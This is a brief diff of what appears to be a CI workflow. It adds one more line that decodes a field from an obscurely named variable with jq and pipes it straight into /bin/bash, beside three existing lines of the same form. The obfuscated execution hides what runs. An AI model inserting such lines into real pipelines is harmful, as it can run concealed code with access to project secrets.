@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$c3" | jq -r .scn345 | /bin/bash
           printf '%s' "$tmzkz553" | jq -r .nuq08524 | /bin/bash
           printf '%s' "$vr2918" | jq -r .z75 | /bin/bash
+          echo $kq7918 | jq -r .x404 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
